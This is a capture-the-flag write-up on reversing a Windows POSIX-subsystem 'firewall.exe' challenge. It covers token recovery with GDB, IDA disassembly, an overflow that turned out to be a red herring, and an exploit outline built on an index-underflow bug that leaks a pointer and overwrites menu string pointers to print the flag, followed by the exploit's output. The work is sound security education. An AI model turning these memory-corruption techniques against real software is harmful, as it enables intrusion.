# FIREWALL.EXE #

## SHOCKTOP and HEFRPIDGE ##

Firewall.exe the only beautiful Windows executable. My first step was to investigate the PE itself using PPEE. Very quickly I was able to recognize this as a POSIX subsystem executable. This was evident from it's NtHeader.OptionalHeader.Subsystem and It's import directory only  depending on PSXDLL.dll.

![PPEE SUBSYSTEM AND IAT](https://i.imgur.com/zrxpRME.png)

The Windows Services for Unix (SFU) was abandoned after Windows 7 due to it's lack of support beyond POSIX 1.0 and it's dependency on windows. Windows now supports Windows Subsystem for Linux (WSL). SFU relied on PE files instead of ELF files, now supported with WSL using Minimal Pico Processes, [https://blogs.msdn.microsoft.com/wsl/2016/05/23/pico-process-overview/](https://blogs.msdn.microsoft.com/wsl/2016/05/23/pico-process-overview/ "Pico Process Overview").

To support SFU, first I needed a Windows 7 VM and I needed to enable the Subsystem for UNIX-based Applications

![Windows Subsystem For Unix Feature Installation](https://i.imgur.com/8wxKymt.png)

then I needed to install the [https://www.microsoft.com/en-us/download/details.aspx?id=23754](https://www.microsoft.com/en-us/download/details.aspx?id=23754 "Utilities and SDK for UNIX-based Applications")

Once this is installed running a posix subsystem application application will work. Included in this install was the oh so recent C-Shell and the ability to run GDB. GDB came in handy because Immunity had no idea how to debug a posix subsystem binary and I didn't try WinDbg.

Netcatting to the ctf server on port 4141 or running the program gave you the same experience. You were presented with a service access token request. I tried a couple number hoping to get lucky. If the number fails the program exits, time to reverse.

![](https://i.imgur.com/l7qGbjM.png)

![](https://i.imgur.com/AmF4q2e.png)

CheckServiceToken would create an access token based on your envp pointer and a not so random number. First create_access_token would srand with a static number of 'doom' and then it starts the access token loop with the integer value of INTE (first 4 bytes of that env variable), then loops through 100 times adding a random value to the access token. So breaking at 4023c7 was the simpler way than scripting up this access token creation.

    % gdb firewall.exe
	(gdb) r
	Starting program: /dev/fs/C/reverse/firewall.exe
	+----------------------------------------+
	|-------[ FIREWALL CONTROL PANEL ]-------|
	+----------------------------------------+
	| ENTER SERVICE ACCESS TOKEN:
	Program received signal SIGINT, Interrupt.
	0x77c1153a in ?? ()
	(gdb) info stack
	#0  0x77c1153a in ?? ()
	#1  0x744514fc in ?? ()
	#2  0x74453075 in ?? ()
	#3  0x011340df in ?? ()
	#4  0x0113418b in ?? ()
	#5  0x01133fcf in ?? ()
	#6  0x011347c6 in ?? ()
	#7  0x01131b68 in ?? ()
	#8  0x01131bdc in ?? ()
	#9  0x011323bf in ?? ()
	#10 0x01132450 in ?? ()
	#11 0x0113102c in ?? ()
	#12 0x011311fb in ?? ()
	#13 0x744500de in ?? ()
	(gdb) br *0x011323c7
	Breakpoint 1 at 0x11323c7
	(gdb) c
	Continuing.
	1234
	
	Breakpoint 1, 0x011323c7 in ?? ()
	(gdb) p $ecx
	$1 = 352762356
	(gdb) c
	Continuing.
	
	Program exited normally.
	(gdb) r
	Starting program: /dev/fs/C/reverse/firewall.exe
	+----------------------------------------+
	|-------[ FIREWALL CONTROL PANEL ]-------|
	+----------------------------------------+
	| ENTER SERVICE ACCESS TOKEN: 352762356
	
	| +-------------------------+
	| |- MENU                   |
	| +-------------------------+
	| | 1. add firewall rule    |
	| | 2. edit firewall rule   |
	| | 3. delete firewall rule |
	| | 4. print firewall rule  |
	| | 5. list firewall rules  |
	| | 6. check credentials    |
	| | 7. help                 |
	| | 8. quit                 |
	| +-------------------------+
	| MENU SELECTION:

Now that we have the access token we need to find that flag. The goal of this was to determine if this firewall was still safe for another year. I looked a little at the program flow in IDA (given I did a lot of static analysis before I got to actually running the binary. We actually never focused on getting the binary running until we wanted the access key and interact with it)

![](https://i.imgur.com/vrsylKd.png)
![](https://i.imgur.com/hS7Ku5l.png)

I did a lot of ida grouping to get an idea of the flow of this program. As you can see it is a huge switch statement, that is actually using if/else if. Each function will be associated with its corresponding menu option.

The way this program internally is supposed to work is there are a maximum of 16 firewall rules one can create. Each rule has a name, port and type (protocol). This list is stored in memory as a contiguous array of 16 structures of size 0x1C. So there is a 0x1C0 buffer array. Each firewall rule looks as such:
  
	struct firewall_rule {
		byte		   enabled;
		char		   rule_name[33];
		unsigned short rule_port;
		unsigned int   rule_type;
    };

	00000000 firewall_rule   struc ; (sizeof=0x1C, mappedto_2)
	00000000                                         ; XREF: .data:firewall_rule_list/r
	00000000 enabled         db ?                    ; XREF: AddFirewallRule+33/r
	00000000                                         ; AddFirewallRule+4E/r ...
	00000001 rule_name       db 21 dup(?)            ; XREF: AddFirewallRule+8D/o
	00000001                                         ; EditFirewallRules+A6/o ...
	00000016 rule_port       dw ?                    ; XREF: AddFirewallRule+B4/w
	00000016                                         ; EditFirewallRules+CD/w ...
	00000018 rule_type       dd ?                    ; XREF: AddFirewallRule+D0/o
	00000018                                         ; AddFirewallRule+EC/o ...
	0000001C firewall_rule   ends
	0000001C

We know we need a flag, so my first guess was the authenticate function. It was a good start as it led us to where the flag was stored in memory and it also led us on a red herring as they cleverly called FACADE in memory. As seen below all we need to do is get two values to match and we get our flag. So two questions what is it that needs to be equal and how is the flag created.

![](https://i.imgur.com/RG6IGFp.png)

If you look up above at the huge if/else switch on choice. There is a function that gets called right before that huge menu loop called ReadFlagFile. The contents of that are below.

	.text:004023E0
	.text:004023E0
	.text:004023E0 ; Attributes: bp-based frame
	.text:004023E0
	.text:004023E0 ReadFlagFile proc near
	.text:004023E0
	.text:004023E0 hFlag= dword ptr -4
	.text:004023E0
	.text:004023E0 push    ebp
	.text:004023E1 mov     ebp, esp
	.text:004023E3 push    ecx
	.text:004023E4 push    0
	.text:004023E6 push    offset aFlag    ; "flag"
	.text:004023EB call    _open
	.text:004023F0 add     esp, 8
	.text:004023F3 mov     [ebp+hFlag], eax
	.text:004023F6 push    63
	.text:004023F8 push    offset FLAG_HERE
	.text:004023FD mov     eax, [ebp+hFlag]
	.text:00402400 push    eax
	.text:00402401 call    _read           ; read 63 bytes
	.text:00402406 add     esp, 0Ch
	.text:00402409 mov     ecx, [ebp+hFlag]
	.text:0040240C push    ecx
	.text:0040240D call    _close
	.text:00402412 add     esp, 4
	.text:00402415 mov     esp, ebp
	.text:00402417 pop     ebp
	.text:00402418 retn
	.text:00402418 ReadFlagFile endp
	.text:00402418

So a file gets read from disk called flag and stored at a memory address I labeled FLAG_HERE. So the next question is what is getting compared to FACADE for us to get this flag printed. A cross reference to the memory location, leads us to a function I call init_strings. It is called during c runtime startup.

	.text:0040E960
	.text:0040E960 ; Attributes: bp-based frame
	.text:0040E960
	.text:0040E960 init_strings proc near
	.text:0040E960 push    ebp
	.text:0040E961 mov     ebp, esp
	.text:0040E963 mov     eax, _1_add_firewall_rule
	.text:0040E968 mov     p_1_add_firewall_rule, eax
	.text:0040E96D mov     ecx, _2_editfirewallrule_
	.text:0040E973 mov     p_2_EditFireWallRule, ecx
	.text:0040E979 mov     edx, _3_deleteFirewallRule
	.text:0040E97F mov     p_3_DeleteFireWallRule, edx
	.text:0040E985 mov     eax, _4_printfirewallrule
	.text:0040E98A mov     p_4_PrintFireWallRule, eax
	.text:0040E98F mov     ecx, _5_ListFireWallRules
	.text:0040E995 mov     p_5_listFireWallRules, ecx
	.text:0040E99B mov     edx, _6_CheckCredentials
	.text:0040E9A1 mov     p_6_CheckCredentials, edx
	.text:0040E9A7 mov     eax, _7_help
	.text:0040E9AC mov     p_7_help, eax
	.text:0040E9B1 mov     ecx, _8_quit
	.text:0040E9B7 mov     p_8_quit, ecx
	.text:0040E9BD push    1C0h            ; size of list
	.text:0040E9C2 push    0
	.text:0040E9C4 push    offset firewall_rule_list
	.text:0040E9C9 call    __memset
	.text:0040E9CE add     esp, 0Ch
	.text:0040E9D1 mov     _feel5bad, 0FEE15BADh ; initial cred
	.text:0040E9DB mov     byte_412B30, 0
	.text:0040E9E2 push    40h
	.text:0040E9E4 push    0
	.text:0040E9E6 push    offset FLAG_HERE
	.text:0040E9EB call    __memset
	.text:0040E9F0 add     esp, 0Ch
	.text:0040E9F3 mov     rule_count, 0
	.text:0040E9FA pop     ebp
	.text:0040E9FB retn
	.text:0040E9FB init_strings endp

This function stores pointers to many strings in memory, zeroizes the firewall rule list and sets the cred that we need to authenticate for our flag as 0xFEE15BAD, zeroizes the flag array and then finally sets a global variable I call rule_count to zero. As all of this is stored in the same spot in memory, lets go look how memory is arranged.

	.data:0041294C 00 00 00 00       p_1_add_firewall_rule dd 0              ; DATA XREF: print_menu+2A↑r
	.data:0041294C                                                           ; init_strings+8↑w
	.data:00412950 00 00 00 00       p_2_EditFireWallRule dd 0               ; DATA XREF: print_menu+3D↑r
	.data:00412950                                                           ; init_strings+13↑w
	.data:00412954 00 00 00 00       p_3_DeleteFireWallRule dd 0             ; DATA XREF: print_menu+51↑r
	.data:00412954                                                           ; init_strings+1F↑w
	.data:00412958 00 00 00 00       p_4_PrintFireWallRule dd 0              ; DATA XREF: print_menu+65↑r
	.data:00412958                                                           ; init_strings+2A↑w
	.data:0041295C 00 00 00 00       p_5_listFireWallRules dd 0              ; DATA XREF: print_menu+78↑r
	.data:0041295C                                                           ; init_strings+35↑w
	.data:00412960 00 00 00 00       p_6_CheckCredentials dd 0               ; DATA XREF: print_menu+8C↑r
	.data:00412960                                                           ; init_strings+41↑w
	.data:00412964 00 00 00 00       p_7_help        dd 0                    ; DATA XREF: print_menu+A0↑r
	.data:00412964                                                           ; init_strings+4C↑w
	.data:00412968 00 00 00 00       p_8_quit        dd 0                    ; DATA XREF: print_menu+B3↑r
	.data:00412968                                                           ; init_strings+57↑w
	.data:0041296C 00 00 00 00 00 00+firewall_rule_list firewall_rule 10h dup(<?>)
	.data:0041296C 00 00 00 00 00 00+                                        ; DATA XREF: AddFirewallRule+33↑r
	.data:0041296C 00 00 00 00 00 00+                                        ; AddFirewallRule+4E↑r ...
	.data:00412B2C ?? ?? ?? ??       _feel5bad       dd ?                    ; DATA XREF: authenticate_function+3↑r
	.data:00412B2C                                                           ; init_strings+71↑w
	.data:00412B30 ??                byte_412B30     db ?                    ; DATA XREF: init_strings+7B↑w
	.data:00412B31 ?? ?? ?? ?? ?? ??+FLAG_HERE       db 40h dup(?)           ; DATA XREF: authenticate_function+1C↑o
	.data:00412B31 ?? ?? ?? ?? ?? ??+                                        ; ReadFlagFile+18↑o ...
	.

Our initial idea was can we overflow our fire rule list to overwrite the auth_cred. This had us reversing AddFirewallRule. In my IDB you will see nice basic blocks this is after removing deobfuscation code that created nop jumps. Once removing these jumps and asking IDA to see this as a function basic blocks were back. The logic was sound for buffer overwrite. It iterated the list of firewall rules and checked if it was enabled. If it wasn't enabled it created a new rule. If it got to the max rule count it informed the user "OUT OF FIREWALL RULE SLOTS".

The red herring of the challenge was we were able to get a 3 byte overflow into the auth cred. This was due to a vulnerability in the EditRule function calling fgets with bufsize of 30. 

    .text:00401EF1 push    offset aEnterRuleName_0 ; "ENTER RULE NAME: "
    .text:00401EF6 call    printf_wrapper
    .text:00401EFB add     esp, 4
    .text:00401EFE push    30              ; bufsize... overflow
    .text:00401F00 mov     edx, [ebp+i]
    .text:00401F03 imul    edx, 1Ch
    .text:00401F06 add     edx, offset firewall_rule_list.rule_name
    .text:00401F0C push    edx             ; buffer
    .text:00401F0D call    fgets_wrapper
    .text:00401F12 add     esp, 8

The buffer it is reading into is 21 bytes, follwed by the rest of the structure being 6 bytes, so we get a 3 byte overflow. Unfortunately this was not enough to change the flag to authenticate us. This was because our final byte would always be NULL because of fgets, therefore we only really got a two byte overwrite of the cred that we controlled.

I browsed over a bit of code at one point and didn't really notice it at first, noted it and moved on, just didn't stick out well enough. Then at some point I jacked up typing and seg faulted the program, winner winner chicken dinner! Looking at what I had done I had provided bad input to the edit rule menu. Anytime you wanted to print or edit a rule this little bitty of code happened.


    .text:00401EA8                 push    offset aEditingFirewal ; "EDITING FIREWALL RULE -\n"
    .text:00401EAD                 call    printf_wrapper
    .text:00401EB2                 add     esp, 4
    .text:00401EB5                 push    offset aEnterRuleNumbe ; "ENTER RULE NUMBER TO EDIT: "
    .text:00401EBA                 call    printf_wrapper
    .text:00401EBF                 add     esp, 4
    .text:00401EC2                 call    fgets_atoi
    .text:00401EC7                 mov     [ebp+i], eax
    .text:00401ECA                 cmp     [ebp+i], 0
    .text:00401ECE                 jb      short loc_401ED6
    .text:00401ED0                 cmp     [ebp+i], 10h
    .text:00401ED4                 jbe     short loc_401EE8
    .text:00401ED6
    .text:00401ED6 loc_401ED6:                             ; CODE XREF: EditFirewallRules+6E↑j
    .text:00401ED6                 push    offset aInvalidRule ; "INVALID RULE!\n"
    .text:00401EDB
    .text:00401EDB loc_401EDB:
    .text:00401EDB                 call    printf_wrapper
    .text:00401EE0                 add     esp, 4
    .text:00401EE3                 jmp     loc_401FC0
    .text:00401EE8 ; ---------------------------------------------------------------------------
    .text:00401EE8
    .text:00401EE8 loc_401EE8:                              ; CODE XREF: EditFirewallRules+74↑j
    .text:00401EE8                 mov     ecx, [ebp+i]		; user supplied index
    .text:00401EEB                 sub     ecx, 1			; subtract 1... supply 0, get rule[-1] 
    .text:00401EEE                 mov     [ebp+i], ecx

What this essentially did was ask the user what rule they want to edit. Expecting the user to give a value of 1-16. It then converts that number to array index with sub ecx, 1. Giving the input of 0, gave us a -1 offset of the array. This allowed us to now read and write to memory prior to the array. Looking at memory again this was beneficial and showed why we crashed on bad input.

	.data:0041294C 00 00 00 00       p_1_add_firewall_rule dd 0              ; DATA XREF: print_menu+2A↑r
	.data:0041294C                                                           ; init_strings+8↑w
	.data:00412950 00 00 00 00       p_2_EditFireWallRule dd 0               ; DATA XREF: print_menu+3D↑r
	.data:00412950                                                           ; init_strings+13↑w
	.data:00412954 00 00 00 00       p_3_DeleteFireWallRule dd 0             ; DATA XREF: print_menu+51↑r
	.data:00412954                                                           ; init_strings+1F↑w
	.data:00412958 00 00 00 00       p_4_PrintFireWallRule dd 0              ; DATA XREF: print_menu+65↑r
	.data:00412958                                                           ; init_strings+2A↑w
	.data:0041295C 00 00 00 00       p_5_listFireWallRules dd 0              ; DATA XREF: print_menu+78↑r
	.data:0041295C                                                           ; init_strings+35↑w
	.data:00412960 00 00 00 00       p_6_CheckCredentials dd 0               ; DATA XREF: print_menu+8C↑r
	.data:00412960                                                           ; init_strings+41↑w
	.data:00412964 00 00 00 00       p_7_help        dd 0                    ; DATA XREF: print_menu+A0↑r
	.data:00412964                                                           ; init_strings+4C↑w
	.data:00412968 00 00 00 00       p_8_quit        dd 0                    ; DATA XREF: print_menu+B3↑r
	.data:00412968                                                           ; init_strings+57↑w
	.data:0041296C 00 00 00 00 00 00+firewall_rule_list firewall_rule 10h dup(<?>)
	.data:0041296C 00 00 00 00 00 00+                                        ; DATA XREF: AddFirewallRule+33↑r
	.data:0041296C 00 00 00 00 00 00+                                        ; AddFirewallRule+4E↑r ...
	.data:00412B2C ?? ?? ?? ??       _feel5bad       dd ?                    ; DATA XREF: authenticate_function+3↑r
	.data:00412B2C                                                           ; init_strings+71↑w
	.data:00412B30 ??                byte_412B30     db ?                    ; DATA XREF: init_strings+7B↑w
	.data:00412B31 ?? ?? ?? ?? ?? ??+FLAG_HERE       db 40h dup(?)           ; DATA XREF: authenticate_function+1C↑o
	.data:00412B31 ?? ?? ?? ?? ?? ??+                                        ; ReadFlagFile+18↑o ...
	.

Writing right before the array is overwriting string pointers that the menu used to print. So our exploit was as follows.

1. Enter Service Access Token
2. Add a rule
3. Leak a memory pointer by printing rule 0
4. Create offset to flag address with leaked pointer
5. overwrite a string pointer in the menu by Adding a rule 0

![](https://i.imgur.com/L9sfNDY.png)



	user@ubuntu1604:~/firewall$ python firewall_sploit.py 
	+----------------------------------------+
	|-------[ FIREWALL CONTROL PANEL ]-------|
	+----------------------------------------+
	| ENTER SERVICE ACCESS TOKEN:
	 | +-------------------------+
	| |- MENU                   |
	| +-------------------------+
	| | 1. add firewall rule    |
	| | 2. edit firewall rule   |
	| | 3. delete firewall rule |
	| | 4. print firewall rule  |
	| | 5. list firewall rules  |
	| | 6. check credentials    |
	| | 7. help                 |
	| | 8. quit                 |
	| +-------------------------+
	| MENU SELECTION:
	 | CREATING FIREWALL RULE -
	| ENTER RULE NAME:
	 | ENTER RULE PORT:
	 | ENTER RULE TYPE:
	 | SUCCESSFULLY CREATED FIREWALL RULE!
	| PRESS ENTER TO RETURN TO MENU
	 | +-------------------------+
	| |- MENU                   |
	| +-------------------------+
	| | 1. add firewall rule    |
	| | 2. edit firewall rule   |
	| | 3. delete firewall rule |
	| | 4. print firewall rule  |
	| | 5. list firewall rules  |
	| | 6. check credentials    |
	| | 7. help                 |
	| | 8. quit                 |
	| +-------------------------+
	| MENU SELECTION:
	 | PRINTING FIREWALL RULE -
	| ENTER RULE NUMBER TO PRINT:
	Image base:  19267584
	 | +-------------------------+
	| |- MENU                   |
	| +-------------------------+
	| | 1. add firewall rule    |
	| | 2. edit firewall rule   |
	| | 3. delete firewall rule |
	| | 4. print firewall rule  |
	| | 5. list firewall rules  |
	| | 6. check credentials    |
	| | 7. help                 |
	| | 8. quit                 |
	| +-------------------------+
	| MENU SELECTION:
	 | EDITING FIREWALL RULE -
	| ENTER RULE NUMBER TO EDIT:
	 | ENTER RULE NAME:
	 | ENTER RULE PORT:
	 | ENTER RULE TYPE:
	 | INVALID RULE TYPE! CANCELING CREATION...
	| PRESS ENTER TO RETURN TO MENU
	 | +-------------------------+
	| |- MENU                   |
	| +-------------------------+
	| | 1. add firewall rule    |
	| | 2. edit firewall rule   |
	| w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh
	| w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh
	| w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh
	| w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh


